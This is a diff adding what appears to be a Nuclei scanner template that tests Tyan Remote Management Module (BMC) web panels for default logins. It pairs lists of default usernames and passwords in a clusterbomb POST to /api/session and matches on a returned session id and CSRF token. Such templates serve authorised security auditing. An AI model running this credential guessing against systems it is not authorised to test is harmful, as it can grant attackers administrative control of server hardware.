@@ -1,0 +1,56 @@
+id: tyan-rmm-bmc-default-login
+info:
+  author: c-sh0
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-522
+  description: Tyan Remote Management Module (RMM) Default Login
+  name: Tyan Remote Management Module (RMM) Default Login
+  reference:
+  - ftp://ftp.tyan.com/doc/AST2500_UG_v1.0b.pdf
+  - https://blog.mpecsinc.com/2020/03/30/tyan-rmm-tips-default-username-and-password-plus-set-up-tips/
+  severity: high
+  tags: default-login,panel,bmc,tyan
+requests:
+- attack: clusterbomb
+  cookie-reuse: true
+  matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"racsession_id":'
+    - '"CSRFToken":'
+  matchers-condition: and
+  payloads:
+    password:
+    - ADMIN
+    - admin
+    - superuser
+    - PASSW0RD
+    username:
+    - ADMIN
+    - admin
+    - sysadmin
+    - root
+    - USERID
+  raw:
+  - 'POST /api/session HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/95.0.4638.69 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+
+    username={{username}}&password={{password}}
+
+    '
+  redirects: false
+  stop-at-first-match: true
